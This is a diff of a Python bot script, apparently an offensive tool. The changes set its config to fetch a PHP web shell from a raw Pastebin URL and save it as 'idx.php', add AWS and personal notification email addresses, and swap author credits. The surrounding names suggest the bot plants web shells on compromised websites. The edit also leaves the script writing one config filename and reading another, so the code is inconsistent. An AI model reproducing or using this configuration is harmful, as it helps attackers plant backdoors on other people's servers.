@@ -94,25 +94,29 @@ os.system("cls" if os.name == "nt" else "clear")
 if not os.path.exists("results"):
     os.mkdir("results")
 
-if not os.path.exists(""):
+if not os.path.exists("FuckBot.ini"):
     parser = configparser.ConfigParser()
     parser.add_section("scrapestack")
     parser.set("scrapestack", "scrapestack_key", "put_your_scrapestack_key_here")
     parser.add_section("shell")
-    parser.set("shell", "shell_url", "")
-    parser.set("shell", "shell_name", "")
+    parser.set("shell", "shell_url", "https://pastebin.com/raw/C5zzy6r4")
+    parser.set("shell", "shell_name", "idx.php")
     parser.add_section("aws")
-    parser.set("aws", "email", "")
+    parser.set("aws", "email", "mbd2dz@gmail.com")
     parser.add_section("email")
-    parser.set("email", "your_mail", "")
+    parser.set("email", "your_mail", "mbd2dz@gmail.com")
     
-    with open("", "w") as fp:
+    with open("FuckBot.ini", "w") as fp:
         parser.write(fp)
     fp.close()
 
 
 """
- Author: OXiZ3N
+ Author: Ilham Putra H (iDevXploit) <admin_kuli@idevxploit.io>
+ Author: Malaikat Bounty (0x0verfl0w) <b4p3r_0verfl0w@idevxploit.io>
+ Version: 1.0 Beta (17-01-2023)
+ 
+ Note: Kami Tidak Sepenuhnya Menggunakan Akal Dan Pikiran Kami Saat Membuat Bot Bangsad Ini
 """
 
 class Worker(Thread):
@@ -172,7 +176,7 @@ class FuckBot:
     PATH_RESULT = os.path.join(PATH_ROOT, "results")
 
     config = configparser.ConfigParser()
-    config.read('FuckBot.ini')
+    config.read('OXiZ3N.ini')
 
     SCRAPESTACK_KEY = config.get("scrapestack", "scrapestack_key")
     
@@ -193,7 +197,6 @@ class FuckBot:
         
         print("\n")
         print(Color.RED("Developed By") + ": " + Color.BLUE("@OXiZ3N"))
-
         print("\n")
         
 
@@ -506,7 +509,7 @@ class FuckBot:
             
         status_message += "%s " % Color.WHITE(data)
         
-        status_message += "[%s - %s]" % (Color.CYAN("./J3mBotMaw0ttz"), Color.YELLOW(mode))
+        status_message += "[%s - %s]" % (Color.CYAN("./OXiZ3N"), Color.YELLOW(mode))
         
         print(self.join_string(status_message))
         
